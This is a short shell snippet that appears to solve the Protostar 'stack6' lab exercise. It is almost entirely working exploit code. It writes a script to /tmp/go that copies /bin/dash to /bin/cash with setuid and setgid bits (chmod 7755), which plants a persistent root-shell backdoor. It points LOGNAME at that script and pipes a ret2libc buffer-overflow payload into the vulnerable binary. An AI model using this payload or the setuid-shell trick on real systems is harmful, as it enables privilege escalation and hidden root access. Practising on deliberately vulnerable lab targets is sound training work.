echo "#! /bin/sh" >/tmp/go
echo "cp /bin/dash /bin/cash" >>/tmp/go
echo "chmod 7755 /bin/cash" >>/tmp/go
chmod +x /tmp/go
export LOGNAME=/tmp/go
# 80 A's + System Address + Exit Address + LOGNAME Environment Address
perl -E 'say "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x93\xff\xff\xbf"' | /opt/protostar/bin/stack6
